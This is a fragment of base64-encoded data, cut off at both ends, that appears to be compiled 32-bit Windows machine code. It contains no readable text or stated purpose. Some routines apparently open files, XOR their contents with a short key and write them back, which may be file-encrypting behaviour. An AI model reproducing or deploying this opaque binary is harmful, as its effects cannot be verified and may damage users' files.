wOXsQdFKNpCQAAAAAi3Xk6BZMAABOM9L39o1F1FCNdbiL2uiFBwAAagDGRfwCi3W0UIPI/+iTCQAAxkX8AYN9zBByDItNuFHo/0sAAIPEBDl+EHW4i120g33oEHIMi1XUUujlSwAAg8QEi8OLTfRkiQ0AAAAAWV9eW4tN8DPN6NpGAACL5V3DzMzMzMxVi+xq/2j5A0EAZKEAAAAAUIPsRKE8EkAAM8WJRfBTVldQjUX0ZKMAAAAAM/aJdfyL2VaJXbSJdbDo3UsAAFDoSEsAAIl15I1+JIPECLhwQEAAjXXUx0XoDwAAAMZF1ADoqwoAALgBAAAAiUX8x0MUDwAAAMdDEAAAAADGAwCDexAHiUWwjXgPdFGNmwAAAACLdeToBksAAE4z0vf2jUXUUI11uIva6HUGAABqAMZF/AKLdbRQg8j/6IMIAADGRfwBOX3McgyLTbhR6PBKAACDxASDfhAHdbiLXbQ5fehyDItV1FLo1koAAIPEBIvDi030ZIkNAAAAAFlfXluLTfAzzejLRQAAi+Vdw8zMzMzMzFWL7IHsEAIAAKE8EkAAM8WJRfxWjYX0/f//UGoAagBqKGoAi/HHhfD9//8AAAAA/xVUEUAAM8mNhfT9///HRhQHAAAAx0YQAAAAAGaJDo1QAmaLCIPAAmaFyXX1K8LR+FCNhfT9///oZAoAAItN/IvGM81e6EhFAACL5V3DzMzMVYvsav9oXwVBAGShAAAAAFCB7OQAAAChPBJAADPFiUXwU1ZXUI1F9GSjAAAAALi8HUAAjY0Q////6JL8//+L2DP/uGQeQACNjWT///+Jffzoe/z//1C4sEBAAI11gMZF/AHouRAAAFC4rEBAAI11nMZF/ALoNxEAAIvIjUW4UIvDxkX8A+i2EQAAULicQEAAjbVI////xkX8BOgREQAAULiYQEAAjXXUxkX8Bej/EAAAuxAAAACDxBQ5WBRyAosAV1dQaARBQABXV/8VUBFAADld6HIMi03UUehRSQAAg8QEvg8AAACJdeiJfeTGRdQAOZ1c////cg+LlUj///9S6CtJAACDxASJtVz///+JvVj////GhUj///8AOV3McgyLRbhQ6AdJAACDxASJdcyJfcjGRbgAOV2wcgyLTZxR6OxIAACDxASJdbCJfazGRZwAOV2UcgyLVYBS6NFIAACDxASJdZSJfZDGRYAAOZ14////cg+LhWT///9Q6LBIAACDxATHRfz/////ibV4////ib10////xoVk////ADmdJP///3IPi40Q////Ueh/SAAAg8QEuLwdQACNjRD////oDfv//4v4uGQeQACNTdTHRfwGAAAA6Pf6//9QuBBBQACNtUj////GRfwH6DIPAABQuKxAQACNdbjGRfwI6LAPAACLyI1VnFKLx8ZF/AnoLxAAAFC4nEBAAI11gMZF/ArojQ8AAFC4mEBAAI21ZP///8ZF/AvoeA8AAIPEFDlYFHICiwAz9lZWUGgEQUAAVlb/FVARQAA5nXj///9yD4uFZP///1Dox0cAAIPEBL8PAAAAib14////ibV0////xoVk////ADldlHIMi02AUeieRwAAg8QEiX2UiXWQxkWAADldsHIMi1WcUuiDRwAAg8QEiX2wiXWsxkWcADldzHIMi0W4UOhoRwAAg8QEiX3MiXXIxkW4ADmdXP///3IPi41I////UehHRwAAg8QEib1c////ibVY////xoVI////ADld6HIMi1XUUugjRwAAg8QEx0X8/////4l96Il15MZF1AA5nST///9yD4uFEP///1Do+0YAAIPEBIl96Il15L8qAAAAuGRBQACNddTGRdQA6C0GAACLRdQ5XehzAovGagBqAFBoBEFAAGoAagD/FVARQAA5XehyDItN1FHosEYAAIPEBL8uAAAAuJBBQACNddTHRegPAAAAx0XkAAAAAMZF1ADo2gUAAItF1Dld6HMCi8ZqAGoAUGgEQUAAagBqAP8VUBFAADld6HIMi1XUUuhdRgAAg8QEvygAAAC4wEFAAI111MdF6A8AAADHReQAAAAAxkXUAOiHBQAAi0XUOV3ocwKLxmoAagBQaARBQABqAGoA/xVQEUAAOV3ocgyLRdRQ6ApGAACDxAS/LgAAALjsQUAAjbUs////x4VA////DwAAAMeFPP///wAAAADGhSz///8A6CgFAACLhSz///85nUD///9zAovGagBqAFBoBEFAAGoAagD/FVARQAA5nUD///9yD4uNLP///1Hon0UAAIPEBItN9GSJDQAAAABZX15bi03wM83olkAAAIvlXcPMVovxi8hXx0YUDwAAAMdGEAAAAADGBgCNeQGNmwAAAACKEUGE0nX5K8+L+eigBAAAX4vGXsPMzMzMzMz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LxsYEOABfi8ZeW13CBADMzFWL7IP//3UKaDRCQADoly0AAIP//nYKaDRCQADoiC0AAItGFDvHcyOLRhBQV1boTfj//4X/dHOD/wF1OIN+FBByKYsGik0IiAjrRIX/deiJfhCD+BByC4sGxgAAi8ZdwgQAi8bGAABdwgQAik0Ii8aICOsbg34UEHIEiwbrAovGD75VCFdSUOjUagAAg8QMg34UEIl+EHIMiwbGBDgAi8ZdwgQAi8bGBDgAi8ZdwgQAVYvsav9oxgRBAGShAAAAAFCB7MQAAAChPBJAADPFiUXwU1ZXUI1F9GSjAAAAAIM9BB5AAAMPhsQBAAChREJAAGaLDUhCQACKFUpCQABqeYmFcP///42Fd////2oAUGaJjXT///+IlXb////oQGoAAIs9CB5AAIsN9B1AAIPEDMeFNP///wAAAACLwYP/EHMFuPQdQACNcAGKEECE0nX5K8aD/xBzBbn0HUAAizUUEEAAagBqAI2VNP///1JqAGoBUFH/1ouFNP///1DohjMAAIs9CB5AAIPEBIvYofQdQACD/xBzBbj0HUAAjUgBjUkAihBAhNJ1+SvBiw30HUAAg/8QcwW59B1AAGoAagCNlTT///9SU2oBUFH/1mgIBAAA6DEzAACL8I2FcP///4PEBI14AYoIQITJdfkrx1CNhXD///9Q6EcqAACLjTT///9RU4vG6BgrAABW6L4yAACDxBQz/7hLQkAAvvQdQADozvD//4vDx4Vo////DwAAAIm9ZP///8aFVP///wCNcAGL/4oIQITJdfkrxov4i8ONtVT////omPD//zP/iX38Ob00////diuDvWj///8Qi4VU////cwaNhVT///+KHDi+9B1AAOj5AgAARzu9NP///3LVx0X8/////4O9aP///xByD4uVVP///1Lo8zAAAIPEBIM9IB5AAAMPhmsCAAChREJAAGaLDUhCQACKFUpCQABqeYmFcP///42Fd////2oAUGaJjXT///+IlXb////ob2gAAIs9JB5AAIsNEB5AAIPEDMeFMP///wAAAACLwYP/EHMFuBAeQACNcAGNpCQAAAAAihBAhNJ1+SvGg/8QcwW5EB5AAGoAagCNlTD///9SagBqAVBR/xUUEEAAi4Uw////UOiwMQAAizUkHkAAiw0QHkAAg8QEi9iLwYP+EHMFuBAeQACNeAGKEECE0nX5K8eD/hBzBbkQHkAAagBqAI2VMP///1JTagFQUf8VFBBAAGgIBAAA6F0xAACL8I2FcP///4PEBI14AYoIQITJdfkrx1CNhXD///9Q6HMoAACLjTD///9RU4vG6EQpAABW6OowAACDxBQz/7hLQkAAvhAeQADo+u7//4vDx4VM////DwAAAIm9SP///8aFOP///wCNcAGKCECEyXX5K8aL+IvDjbU4////6Mbu//8z/8dF/AEAAAA5vTD///8PhswAAAChIB5AAIuNOP///7oQAAAAOZVM////cwaNjTj///+KHDmDyf8ryIP5AQ+GkwAAAI1wAYP+/g+HhwAAAIsNJB5AADvOc2BQVmgQHkAA6PDz//+hIB5AALoQAAAAhfZ0N4sNEB5AADkVJB5AAHMFuRAeQACIHAGhEB5AAIk1IB5AADkVJB5AAHMFuBAeQADGBDAAoSAeQABHO70w////D4Ji////6yyF9nW2oRAeQACJNSAeQAA7ynMFuBAeQADGAADrz2g0QkAA6J4oAAC6EAAAADmVTP///3IPi5U4////Uuh7LgAAg8QEi030ZIkNAAAAAFlfXluLTfAzzehyKQAAi+Vdw8zMzMzMzMzMzMzMzMxVi+xWi8hXjXEBjZsAAAAAihFBhNJ1+SvOi3UIi/nofe3//19eXcIEAMzMzMzMzMyLThCDyP8rwYP4AXcKaDRCQADoEigAAFeNeQGD//52Cmg0QkAA6P8nAACLRhQ7x3MdUVdW6Mfy//+F/3RKi04QuhAAAAA5VhRyIIsG6x6F/3XriX4Qg/gQcgmLBsYAAIvGX8OLxsYAAF/Di8aIHAiJfhA5VhRyCosGxgQ4AIvGX8OLxsYEOACLxl/DzMzMzMxVi+yD7BihrCVBAIsNsCVBAFaLNRQQQABqAGoAjVX8UmoAagFoyAIAAGhATUAAiUX0iU3wx0X8AAAAAP/WhcB1B1D/FXAQQACLRfxQ6KUuAACDxASjqCVBAGoAhcB1Bv8VcBBAAGoAjU38UVBqAWjIAgAAaEBNQAD/1moAhcB1Bv8VcBBAAIs1ABBAAGoBaExCQABqAI1V9FL/1oXAdRtqCGoBaExCQABQjUX0UP/WhcB1B1D/FXAQQACLVfyhqCVBAI1N8FGLTfRqAGoAUlBR/xUIEEAAagCFwHUG/xVwEEAAi0XwizUEEEAAjVX4UmoAagBqAWoAUMdF+AAAAADHRegxAAAA/9aFwHUHUP8VcBBAAItN+ItF8FGNVehSaEAkQQBqAGoBagBQ/9aFwHUHUP8VcBBAAItV+FeLPRgQQACNTexRagBqAVJoQCRBAMdF7AAAAAD/14XAdQdQ/xVwEEAAi0XsUOgqJwAAi1X4g8QEjU3sUYvwVmoBUmhAJEEA/9dfhcB1B1D/FXAQQABonB5AAIvG6KX9//+LRfRqAFD/FQwQQABei+Vdw8zMzMxVi+xq/2gQCEEAZKEAAAAAUIPsWKE8EkAAM8WJRfBTVldQjUX0ZKMAAAAAaiCNTZzo297//4PEBIvwM9uNexCB/kgeQAB0Zzk9XB5AAHIOoUgeQABQ6IUrAACDxATHBVweQAAPAAAAiR1YHkAAiB1IHkAAOX4UcxWLRhBAUFZoSB5AAOi4JwAAg8QM6wqLDokNSB5AAIkei1YQiRVYHkAAi0YUo1weQACJXhCJXhTHRfz/////OX2wcgyLTZxR6BwrAACDxARo6AMAAP8VSBBAAFeNTZzoNt7//4PEBIvwgf4sHkAAdGg5PUAeQAByD4sVLB5AAFLo5CoAAIPEBMcFQB5AAA8AAACJHTweQACIHSweQAA5fhRzFYtGEEBQVmgsHkAA6BcnAACDxAzrCYsGoyweQACJHotOEIkNPB5AAItWFIkVQB5AAIleEIleFMdF/P////85fbByDItFnFDoeyoAAIPEBI1NuFHokAEAAIPEBIvIuCweQACNfdTHRfwCAAAA6DcCAAC/EAAAAMZF/AQ5fcxyDItVuFLoPyoAAIPEBItV6ItF1MdFzA8AAACJXciIXbiLyDvXcwONTdQDTeQ713MDjUXUO8F0Eb5AJEEAK/CKEIgUMEA7wXX26G38//+LFVweQAChSB5AAIvIO9dzBblIHkAAAw1YHkAAO9dzBbhIHkAAO8F0Eb6IJUEAK/CKEIgUMEA7wXX2ixVAHkAAoSweQACLyDvXcwW5LB5AAAMNPB5AADvXcwW4LB5AADvBdBS+eCVBACvwjUkAihCIFDBAO8F19jl96HIMi0XUUOh3KQAAg8QEi030ZIkNAAAAAFlfXluLTfAzzehuJAAAi+Vdw8zMzMzMzMzMzDv3dF2DfhQQcguLBlDoPSkAAIPEBMdGFA8AAADHRhAAAAAAxgYAg38UEHMRi08QQVFXVuh4JQAAg8QM6wqLF4kWxwcAAAAAi0cQiUYQi08UiU4Ux0cQAAAAAMdHFAAAAACLxsPMzMzMzMzMzMzMzMxVi+xq/2iJBEEAZKEAAAAAUFFWV6E8EkAAM8VQjUX0ZKMAAAAAi3UIx0XwAAAAAMdGFA8AAADHRhAAAAAAxgYAx0X8AAAAAKFYHkAAi34QQMdF8AEAAAA7+HcmOUYUdCFqAVCLxug26///hMB0E4N+FBCJfhByBIsG6wKLxsYEOABqAGhIHkAAg8j/6NDl//9qAbh8QkAAi87o4vD//4vGi030ZIkNAAAAAFlfXovlXcPMzMzMzMzMzMzMzMzMzMxVi+xRU1Yz21NQg8j/i/GJXfzoieX//4vwx0cUDwAAAIlfEIgfO/50TIN/FBByC4sPUejoJwAAg8QEx0cUDwAAAIlfEIgfg34UEHMRi1YQQlJWV+goJAAAg8QM6waLBokHiR6LThCJTxCLVhSJVxSJXhCJXhRei8dbi+Vdw8zMzOj70f//oXglQQCLDXwlQQCLFYAlQQCjaCVBAKGEJUEAiQ1sJUEAiRVwJUEAo3QlQQDDzMzMzMzMzMzMzMzMzMxVi+xq/2iTB0EAZKEAAAAAULjQEQAA6EVuAAChPBJAADPFiUXwU1ZXUI1F9GSjAAAAAI2FnO///1C4gB5AAMdF/AAAAADoBtn//42N1O///1GNXQjGRfwB6OMJAABQuIBCQACNjbjv///GRfwC6A4KAAC+CAAAAIPEDDlwFHICiwBQ/xUoEEAAg/j/D5SFL+7//zm1zO///3IPi5W47///Uui5JgAAg8QEM9szwL8HAAAAib3M7///iZ3I7///ZomFuO///zm16O///3IPi43U7///UeiGJgAAg8QEM9KIXfyJvejv//+JneTv//9miZXU7///ObWw7///cg+LhZzv//9Q6FcmAACDxAQ4nS/u//8PhIgEAAC4vB1AAI2NoO7//+jZ2P//i/iNjUzu//9RxkX8A+iXCQAAULjQSUAAjbX07v//xkX8BOiS7f//i8iNlSzv//9Si8fGRfwF6A7u//9QuPhHQACNtWTv///GRfwG6Gnt//+LyLiAHkAAjb287v//xkX8B+iz/f//ULiQR0AAjbWE7v//xkX8COg+7f//i8i49B1AAI29gO///8ZF/AnoiP3//1C4IEdAAI212O7//8ZF/AroE+3//4vIuBAeQACNvRDv///GRfwL6F39//9QuKBCQACNtWju///GRfwM6Ojs//+LyLicHkAAjb1I7///xkX8Degy/f//ULicQkAAjbW47///xkX8Dui97P//g8QgvxAAAAA5vVzv//9yD4uFSO///1DoICUAAIPEBL4PAAAAibVc7///iZ1Y7///iJ1I7///Ob187v//cg+LjWju//9R6PIkAACDxASJtXzu//+JnXju//+InWju//85vSTv//9yD4uVEO///1LoySQAAIPEBIm1JO///4mdIO///4idEO///zm97O7//3IPi4XY7v//UOigJAAAg8QEibXs7v//iZ3o7v//iJ3Y7v//Ob2U7///cg+LjYDv//9R6HckAACDxASJtZTv//+JnZDv//+InYDv//85vZju//9yD4uVhO7//1LoTiQAAIPEBIm1mO7//4mdlO7//4idhO7//zm90O7//3IPi4W87v//UOglJAAAg8QEibXQ7v//iZ3M7v//iJ287v//Ob147///cg+LjWTv//9R6PwjAACDxASJtXjv//+JnXTv//+InWTv//85vUDv//9yD4uVLO///1Lo0yMAAIPEBIm1QO///4mdPO///4idLO///zm9CO///3IPi4X07v//UOiqIwAAg8QEibUI7///iZ0E7///iJ307v//Ob1g7v//cg+LjUzu//9R6IEjAACDxASJtWDu//+JnVzu//+InUzu///GRfwbOb207v//cg+LlaDu//9S6FQjAACDxASLlczv//+Ljcjv//+Lhbjv//+JtbTu//+JnbDu//+InaDu//+JjSju//+L8DvXcwaNtbjv//8DzjvXcwaNhbjv//87wXQWjbXw7///K/CNZCQAihCIFDBAO8F19o2FMO7//1C4gB5AAOjV1P//jY2c7///UY1dCMZF/BzosgUAAFC4gEJAAI2N1O///8ZF/B3o3QUAAL4IAAAAg8QMObWw7///cg+LlZzv//9S6KAiAACDxAQz2zPAx4Ww7///BwAAAImdrO///2aJhZzv//85tUTu//9yD4uNMO7//1HobiIAAIPEBIuF1O///zm16O///3MGjYXU7///U2iAAAAAagJTU2gAAADAUP8VMBBAAIvwO/N0LlNTU1b/FSAQQACLhSju//9TjZUk7v//UlCNjfDv//9RVv8VJBBAAFb/FTwQQACDvejv//8Icg+LldTv//9S6PghAACDxAQzwMeF6O///wcAAACJneTv//9miYXU7///Ob3M7///cg+Ljbjv//9R6MghAACDxAS+CAAAADl1HHIMi1UIUuiyIQAAg8QEi030ZIkNAAAAAFlfXluLTfAzzeipHAAAi+Vdw8zMzMxVi+xq/2icBkEAZKEAAAAAUIHs5AAAAKE8EkAAM8WJRfBTVldQjUX0ZKMAAAAAjYUQ////UDP/uPQdQACJffzoPNP//4vwjY1I////UbiAHkAAxkX8Aegl0///i9hoKEpAAI1VCFKNRYBQxkX8AuhNBQAAi8iNVZxSi8PGRfwD6CwGAABQuCBKQACNTbjGRfwE6BoEAACLyI2FLP///1CLxsZF/AXoBgYAAFC4GEpAAI2NZP///8ZF/Abo8QMAAIPEJIvIjV3UxkX8B+hgBgAAvggAAAA5tXj///9yD4uNZP///1HopiAAAIPEBDPSuwcAAACJnXj///+JvXT///9miZVk////ObVA////cg+LhSz///9Q6HUgAACDxAQzyYmdQP///4m9PP///2aJjSz///85dcxyDItVuFLoTyAAAIPEBDPAiV3MiX3IZolFuDl1sHIMi02cUegyIAAAg8QEM9KJXbCJfaxmiVWcOXWUcgyLRYBQ6BUgAACDxAQzyYldlIl9kGaJTYA5tVz///9yD4uVSP///1Lo8h8AAIPEBDPAiZ1c////ib1Y////ZomFSP///zm1JP///3IPi40Q////UejGHwAAg8QEi03UOXXocwONTdSLRQg5dRxzA41FCFFQ/xU4EEAAOXXocgyLVdRS6JcfAACDxAQzwIld6Il95GaJRdQ5dRxyDItNCFHoeh8AAIPEBItN9GSJDQAAAABZX15bi03wM83ocRoAAIvlXcPMzMzMzMzMzMzMzMxVi+xq/2jIB0EAZKEAAAAAUIPsGFNWV6E8EkAAM8VQjUX0ZKMAAAAAx0X8AAAAAIN9HAiLRQhzA41FCGoAaIAAAABqA2oAagBoAAAAwFD/FTAQQACL2IXbD4RxAQAAjUXcUFP/FTQQQACLdeCLfdyF9g+MlAAAAH8Mgf8AcQIAD4aGAAAAagBqAGoAU/8VIBBAAGgAcQIA6LoZAACDxARqAI1N8FGL8GgAcQIAVlOJdej/FSwQQAC/aCVBAIvGK/7HRewQJwAA6weNpCQAAAAAi/C5EAAAAIoUNzAWRkl19+h7zf//g+8Q/03si8Z14WoAagBqAFP/FSAQQACLTfCLdehqAI1F5FBR63xqAGoQVlfommoAAAvCdCGNmwAAAABqAIPH/2oQg9b/Vlfof2oAAAvCdeuJdeCJfdyLPSAQQABqAGoAagBT/9eLVdxS6AMZAACLTdyDxARqAIvwjUXwUFFWU/8VLBBAAItN3IvG6JzO//9qAGoAagBT/9eLRfBqAI1V5FJQVlP/FSQQQABW6HwdAACDxART/xU8EEAAg+wci8wz0oll6FKNRQhQx0EUBwAAAMdBEAAAAACDyP9miRHoCdr//+j0+///g8Qcg30cCHIMi00IUehxHQAAg8QEi030ZIkNAAAAAFlfXluL5V3DzMzMzMzMzMzMzMzMzDPAUMdGFAcAAADHRhAAAAAAZokGUYPI/4vO6LHZ//+LxsPMzMzMzMzMzMzMzMzMzFWL7FFWVzP/i/CJffzoDgUAAIt1CIl+EDPJx0YUBwAAAIv4ZokO6AXZ//9fi8Zei+Vdw8zMzMzMzMzMzMzMzMxVi+xRVovxi8hXx0X8AAAAAI15AmaLEYPBAmaF0nX1K8/R+VGLTQjohAMAADPJx0YUBwAAA